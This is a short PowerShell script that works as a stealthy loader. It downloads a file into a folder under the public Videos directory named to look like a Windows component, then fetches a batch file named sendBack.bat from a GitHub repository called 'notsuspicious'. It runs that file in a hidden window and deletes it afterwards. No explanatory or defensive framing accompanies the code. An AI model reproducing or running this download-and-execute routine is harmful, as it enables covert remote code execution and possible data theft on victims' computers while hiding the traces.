try {
    Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\url.txt'
}
catch {
    exit
}

try {
    $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
}
catch {
    exit
}
finally {
    # Delete the batch file after execution
    Remove-Item -Path "C:\Users\Public\Videos\sendBack.bat" -Force
}
